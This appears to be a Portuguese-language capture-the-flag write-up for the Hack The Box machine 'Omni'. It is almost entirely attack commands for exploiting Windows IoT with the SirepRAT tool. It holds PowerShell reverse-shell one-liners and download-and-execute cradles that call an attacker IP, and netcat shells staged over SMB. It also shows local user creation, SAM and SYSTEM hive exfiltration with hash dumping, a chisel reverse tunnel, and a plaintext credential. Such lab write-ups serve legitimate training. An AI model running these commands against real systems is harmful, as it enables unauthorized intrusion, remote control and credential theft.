Omni
========================

## Enumeration

    sudo nmap -sS -p 3,17,4567 omni.htb
    
    sudo nmap_enum omni.htb
    
    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn omni.htb | tee nmap_udp_output.txt
    
    sudo nmap -p- -Pn -T5 -n omni.htb | tee nmap_fullportstcp_output.txt

![qownnotes-media-mLmhxQ](../../../media/qownnotes-media-mLmhxQ.png)

Dai eu fiz algumas pesquisas no google:

https://www.google.com/search?q=arcserve+discovery+exploit&sca_esv=598988451&rlz=1C1SQJL_pt-BRBR979BR979&sxsrf=ACQVn08oggGf4CXCvLGlEPZfSH8vYlgX5w%3A1705455327264&ei=3y6nZbDUD9fS1sQP8dWssA4&oq=port+29819+exploit&gs_lp=Egxnd3Mtd2l6LXNlcnAiEnBvcnQgMjk4MTkgZXhwbG9pdCoCCAAyChAAGEcY1gQYsAMyChAAGEcY1gQYsANIhRBQAFgAcAF4AZABAJgBAKABAKoBALgBAcgBAOIDBBgAIEGIBgGQBgI&sclient=gws-wiz-serp

https://vulners.com/myhack58/MYHACK58:62201993361

https://www.linkedin.com/pulse/remote-code-execution-sirep-windows-iot-tanzil-rehman

<https://github.com/SafeBreach-Labs/SirepRAT>

## Exploitation

Quando achei esse exploit eu rodei ele de várias formas por meio de tentativa e erro mesmo:



    git clone https://github.com/SafeBreach-Labs/SirepRAT.git
    cd SirepRAT/
    pip install -r requirements.txt
    ls
    python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\Windows\System32\drivers\etc\hosts" --v

Quando eu notei que funcionou  esse exploit, eu dei continuidade somente com ele:

```
    cd SirepRAT/
    python SirepRAT.py 10.10.10.204 GetSystemInformationFromDevice
    python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\WindowsPowerShell\v1. 0\powershell.exe" --args " -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.11/powercat.ps1');powercat -c 10.10.14.11 -p 8082 -e powershell\""
    python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\SysWOW64\WindowsPowerShell\v1. 0\powershell.exe" --args " -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.11/powercat.ps1');powercat -c 10.10.14.11 -p 8082 -e powershell\""
    python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c echo {{userprofile}}"
    python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" --args " -c 'whoami'"
    python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\hostname.exe"
    python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\ipconfig.exe"
    python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" --args 
    python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" --args "-c whoami"
    python SirepRAT.py -h
    python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" --args " -NoP -NonI -W Hidden -Exec Bypass -c whoami"
    python SirepRAT.py 192.168.3.17 PutFileOnDevice --remote_path "C:\Windows\System32\n.ps1" --data "$client = New-Object System.Net.Sockets.TCPClient(\"10.10.14.11\",8082);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    python SirepRAT.py 10.10.10.204 PutFileOnDevice --remote_path "C:\Windows\System32\n.ps1" --data "$client = New-Object System.Net.Sockets.TCPClient(\"10.10.14.11\",8082);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" --args " C:\Windows\System32\n.ps1"
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" --args " -c 'wget http://10.10.14.11'"
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" --args " -c 'wget http://10.10.14.11'"
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" --args " -c hostname"
python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\Windows\System32\n.ps1"
ls
cd payloads/
ls
cd ..
ls
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell -c \"$sm=(New-Object Net.Sockets.TCPClient('10.10.14.11',8082)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}\""
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell 'C:\Windows\System32\n.ps1'"
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell iex (New-Object System.Net.WebClient).DownloadString('http://10.10.14.11/powercat.ps1');powercat -c 10.10.14.11 -p 8082 -e powershell"
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell iex (New-Object System.Net.WebClient).DownloadFile(http://10.10.14.11/nc.exe"
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c pwd"
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c dir"
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c mkdir C:/temp"
    python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c mkdir C:/\temp"
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c mkdir C:\temp"
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c dir c:\temp"
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell iex (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.11/nc.exe') -outfile c:\temp\n1.exe"
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c dir c:\temp"
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.11/nc.exe') -outfile c:\temp\n1.exe"
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell (New-Object System.Net.WebClient).DownloadFile(\"http://10.10.14.11/nc.exe\") -outfile c:\temp\n1.exe"
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell (New-Object System.Net.WebClient).DownloadFile(\"http://10.10.14.11/nc.exe\",\"c:\temp\n1.exe\")"
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.11/nc.exe', 'c:\temp\n1.exe')"
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c certutil -urlcache -split -f \"http://10.10.14.11/nc.exe\" c:\temp\w1.exe"
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c copy \\10.10.14.11\smb\nc.exe c:\temp\w.exe"
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c copy \\10.10.14.11\smb\nc.exe c:\Windows\System32\w.exe"
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c copy \\10.10.14.11\smb\nc.exe"
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c copy \\10.10.14.11\smb\nc.exe w.exe"
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c \"copy \\10.10.14.11\smb\nc.exe w.exe\""
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c 'copy \\10.10.14.11\smb\nc.exe w.exe'"
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c "copy \\10.10.14.11\smb\nc.exe w.exe\""
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c \"copy \\10.10.14.11\smb\nc.exe w.exe\""
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args ' /c "copy \\10.10.14.11\smb\nc.exe w.exe"'
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args ' /c "copy \\10.10.14.11\smb\nc.exe c:\temp\w.exe"'
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args ' /c "c:\temp\w.exe -e C:\Windows\System32\cmd.exe 10.10.14.11 8082"'
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args ' /c "copy \\10.10.14.11\smb\nc64.exe c:\temp\w.exe"'
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args ' /c "c:\temp\w.exe -e C:\Windows\System32\cmd.exe 10.10.14.11 8082"'
python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args ' /c "copy \\10.10.14.11\smb\nc64.exe c:\temp\w.exe & c:\temp\w.exe -e C:\Windows\System32\cmd.exe 10.10.14.11 8082"'
    
    python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args ' /c "net user test test /add"'
    python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c "copy \\10.10.14.11\smb\nc64.exe c:\temp\w.exe & c:\temp\w.exe -e C:\Windows\System32\cmd.exe 10.10.14.11 8082"'
    python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c "powershell -c iex (new-object net.webclient).downloadstring('http://10.10.14.11/shell2.ps1')"'
    python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c "copy \\10.10.14.11\smb\nc64.exe c:\temp\w.exe & c:\temp\w.exe -e C:\Windows\System32\cmd.exe 10.10.14.11 8082"'
    python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c "powershell -ExecutionPolicy Bypass -Command \"[scriptblock]::Create((Invoke-WebRequest \"http://10.10.14.11/shell2.txt\").Content).Invoke();\""'
    python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c "powershell -ExecutionPolicy Bypass -Command [scriptblock]::Create((Invoke-WebRequest \"http://10.10.14.11/shell2.txt\").Content).Invoke();"'
    python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c "copy \\10.10.14.11\smb\nc64.exe c:\temp\w.exe & c:\temp\w.exe -e C:\Windows\System32\cmd.exe 10.10.14.11 8082"'
```

Esse foi o payload que realmente funcionou, no entanto eu já entrei como system na máquina:

    python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c "copy \\10.10.14.11\smb\nc64.exe c:\temp\w.exe & c:\temp\w.exe -e C:\Windows\System32\cmd.exe 10.10.14.11 8084"'
    
Daí eu fiz alguns testes que me pareceram interessantes aqu... Uma vez com acesso na máquina:

    nc -nlvp 8084

## PrivEsc

    reg save HKLM\SAM \\10.10.14.11\smb\sam
    reg save HKLM\SYSTEM \\10.10.14.11\smb\system
    
Com esse modelo eu já consigo fazer o dump de maneira local na minha máquina com um comando simples:

    impacket-secretsdump -sam sam -system system local

![qownnotes-media-lbAHEP](../../../media/qownnotes-media-lbAHEP.png)


Esse foi uma forma de quebrar os hashes de senha, mas uma outra forma que eu achei interessante também foi com o chisel:

    invoke-webrequest http://10.10.14.11/chisel.exe -outfile c.exe
    ./c.exe client 10.10.14.11:9999 R:445:127.0.0.1:445
    
Na máquina atacante eu usei o seguinte comando:

    ./chisel server -p 9999 --socks5 --reverse
    impacket-secretsdump 'app:mesh5143@127.0.0.1'

**Vale ressaltar que esses últimos comandos foi mais para fins de teste, mas considere que a questão é ter uma credencial aadministrativa para obter os hashes de senha**